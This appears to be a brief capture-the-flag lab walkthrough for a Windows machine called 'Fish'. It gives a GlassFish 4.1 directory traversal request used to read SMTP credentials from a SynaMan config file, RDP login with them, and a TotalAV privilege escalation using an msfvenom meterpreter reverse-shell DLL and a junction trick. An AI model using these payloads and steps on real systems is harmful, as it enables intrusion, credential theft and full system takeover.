# Fish

### Enumeration

```
4848/tcp open  http                 Sun GlassFish Open Source Edition  4.1
6060/tcp open  http                 Synametrics Web Server 7 (Syncrify)
8080/tcp open  http                 Sun GlassFish Open Source Edition  4.1
8181/tcp open  ssl/http             Sun GlassFish Open Source Edition  4.1
```

http://192.168.234.168:6060/app - Synametrics Web Server 7 (Syncrify)

SynaMan - Synametrics File Manager 4.0

SynaMan 4.0 build 1488 - SMTP Credential Disclosure

https://www.exploit-db.com/exploits/45387

> C:\SynaMan\config>type AppConfig.xml

Oracle GlassFish Server 4.1 - Directory Traversal

https://www.exploit-db.com/exploits/39441

> The Administration Console of Oracle GlassFish Server, which is listening by default on port 4848/TCP, is prone to a directory traversal vulnerability. This vulnerability can be exploited by remote attackers to access sensitive data on the server being authenticated.
>
> GET /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

view-source:http://192.168.177.168:4848/theme/META-INF/json%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afsynaman/config/appconfig.xml

```
<parameter name="smtpUser" type="1" value="arthur"></parameter>
<parameter name="smtpPassword" type="1" value="[REDACTED]"></parameter>
```

### Initial Access

```
$ xfreerdp /u:arthur /p:[REDACTED] /v:192.168.177.168:3389
```

### PrivEsc

TotalAV 4.14.31.0

TotalAV 2020 4.14.31 - Privilege Escalation

https://www.exploit-db.com/exploits/47897

https://www.youtube.com/watch?v=88qeaLq98Gc

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.177 LPORT=80 -f dll -o version.dll
```

Create these dirs: ForTotalAV -> MountPoint

Quick scan -> Custom Scan -> Add the file -> Start Custom Scan

Action -> Quarantine the file

Delete MountPoint Dir

Then create symbolic link:

mklink /j \Users\arthur\Desktop\ForTotalAV\MountPoint \Windows\Microsoft.NET\Framework\v4.0.30319

Then restore file -> restart computer -> finally get shell
